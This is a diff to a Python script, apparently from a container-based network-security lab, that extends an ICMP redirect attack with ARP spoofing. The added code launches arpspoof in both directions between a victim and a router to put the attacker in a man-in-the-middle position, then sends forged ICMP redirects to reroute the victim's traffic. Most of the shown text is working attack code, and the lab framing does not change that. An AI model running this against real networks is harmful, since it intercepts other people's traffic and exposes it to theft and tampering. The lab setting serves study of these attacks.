@@ -1,21 +1,29 @@
 #!/usr/bin/env python3
 """
-ICMP Redirect Attack - Macvlan Implementation
-==============================================
-This script performs an ICMP redirect attack in a macvlan environment where
-the attacker can actually see victim traffic due to Layer 2 visibility.
+ICMP Redirect Attack with ARP Spoofing - Macvlan Implementation
+================================================================
+This script performs a sophisticated ICMP redirect attack enhanced with ARP spoofing
+in a macvlan environment for maximum effectiveness.
+
+Attack Flow:
+1. ARP Spoofing: Position attacker as man-in-the-middle between victim and router
+2. Traffic Interception: Capture all victim traffic due to MITM position
+3. ICMP Redirects: Send forged ICMP redirects to manipulate victim routing
+4. Traffic Redirection: Victim routes traffic through attacker
 
 Key Features:
+- ARP spoofing for guaranteed traffic interception
 - Uses common packet_craft.py library for packet operations
 - Real traffic sniffing in macvlan environment  
 - Reactive ICMP redirects based on observed traffic
 - Proper ICMP redirect packet structure per RFC 792
 - Comprehensive logging and monitoring
+- Automatic cleanup of ARP spoofing on exit
 
 Network Setup:
 - All containers on same macvlan network (10.9.0.0/24)
-- Attacker can see all L2 traffic via promiscuous mode
-- No need for ARP spoofing or other workarounds
+- Attacker uses ARP spoofing to become man-in-the-middle
+- ICMP redirects further manipulate routing tables
 """
 
 import sys
@@ -23,6 +31,8 @@ import time
 import threading
 import signal
 import atexit
+import subprocess
+import os
 from packet_craft import *
 
 # ═══════════════════════════════════════════════════════════════════════════════════
@@ -49,6 +59,7 @@ attack_active = True
 redirects_sent = 0
 packets_seen = 0
 target_traffic_seen = 0
+arp_spoof_processes = []  # Track ARP spoofing processes
 
 def signal_handler(sig, frame):
     """Handle Ctrl+C gracefully"""
@@ -59,7 +70,11 @@ def signal_handler(sig, frame):
 
 def cleanup():
     """Cleanup function called on exit"""
-    global redirects_sent, packets_seen, target_traffic_seen
+    global redirects_sent, packets_seen, target_traffic_seen, arp_spoof_processes
+    
+    # Stop ARP spoofing
+    stop_arp_spoofing()
+    
     print(f"\n🧹 Attack Summary:")
     print(f"   📊 Packets observed: {packets_seen}")
     print(f"   🎯 Target traffic detected: {target_traffic_seen}")
@@ -235,11 +250,74 @@ def monitor_attack_progress():
                 print(f"⚠️  Error monitoring attack progress: {e}")
             break
 
+def check_arp_spoof_installed():
+    """Check if arpspoof is installed (should be pre-installed during setup)"""
+    try:
+        # Check if arpspoof is available
+        subprocess.run(['which', 'arpspoof'], check=True, capture_output=True)
+        print("✅ arpspoof is available")
+        return True
+    except subprocess.CalledProcessError:
+        print("❌ arpspoof not found!")
+        print("   📦 dsniff package should be installed during container setup")
+        print("   🔧 Run the setup script again to install required packages")
+        return False
+
+def start_arp_spoofing():
+    """Start ARP spoofing to position attacker as man-in-the-middle"""
+    global arp_spoof_processes
+    
+    print(f"🎭 Starting ARP spoofing...")
+    print(f"   Spoofing as router ({ROUTER_IP}) to victim ({VICTIM_IP})")
+    print(f"   Spoofing as victim ({VICTIM_IP}) to router ({ROUTER_IP})")
+    
+    try:
+        # ARP spoof: Tell victim that we are the router
+        proc1 = subprocess.Popen([
+            'arpspoof', '-i', INTERFACE, '-t', VICTIM_IP, ROUTER_IP
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # ARP spoof: Tell router that we are the victim  
+        proc2 = subprocess.Popen([
+            'arpspoof', '-i', INTERFACE, '-t', ROUTER_IP, VICTIM_IP
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        arp_spoof_processes = [proc1, proc2]
+        
+        # Give ARP spoofing time to take effect
+        time.sleep(3)
+        
+        print("✅ ARP spoofing started successfully")
+        print("   📋 Attacker is now man-in-the-middle between victim and router")
+        return True
+        
+    except Exception as e:
+        print(f"❌ Failed to start ARP spoofing: {e}")
+        return False
+
+def stop_arp_spoofing():
+    """Stop ARP spoofing processes"""
+    global arp_spoof_processes
+    
+    if arp_spoof_processes:
+        print("🛑 Stopping ARP spoofing...")
+        for proc in arp_spoof_processes:
+            try:
+                proc.terminate()
+                proc.wait(timeout=5)
+            except:
+                try:
+                    proc.kill()
+                except:
+                    pass
+        arp_spoof_processes = []
+        print("✅ ARP spoofing stopped")
+
 def main():
     """Main attack function"""
     global attack_active
     
-    print("🚀 ICMP Redirect Attack - Macvlan Version")
+    print("🚀 ICMP Redirect Attack with ARP Spoofing")
     print("==========================================")
     print(f"🎯 Target: {VICTIM_IP} (victim)")
     print(f"👹 Attacker: {ATTACKER_IP} (us)")
@@ -253,19 +331,30 @@ def main():
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
     
+    # Check and install ARP spoofing tools
+    if not check_arp_spoof_installed():
+        print("❌ Cannot proceed without arpspoof. Exiting.")
+        return
+    
     # Setup environment
     if not setup_ip_forwarding():
         print("❌ Failed to setup IP forwarding. Continuing anyway...")
     
     print("\n🔧 Attack Prerequisites:")
     print("   ✅ Macvlan network provides L2 visibility")
-    print("   ✅ Attacker interface in promiscuous mode") 
+    print("   ✅ ARP spoofing for man-in-the-middle positioning")
+    print("   ✅ ICMP redirects for routing manipulation") 
     print("   ✅ Victim accepts ICMP redirects")
     print("   ✅ Using realistic packet crafting")
     
     print(f"\n📊 Attack Statistics:")
     print(f"   Max redirects: {MAX_REDIRECTS}")
     print(f"   Redirect delay: {REDIRECT_DELAY}s")
+    
+    # Start ARP spoofing to become man-in-the-middle
+    if not start_arp_spoofing():
+        print("❌ Failed to start ARP spoofing. Attack may be less effective.")
+        input("Press Enter to continue anyway or Ctrl+C to exit...")
     
     # Start monitoring thread
     monitor_thread = threading.Thread(target=monitor_attack_progress, daemon=True)
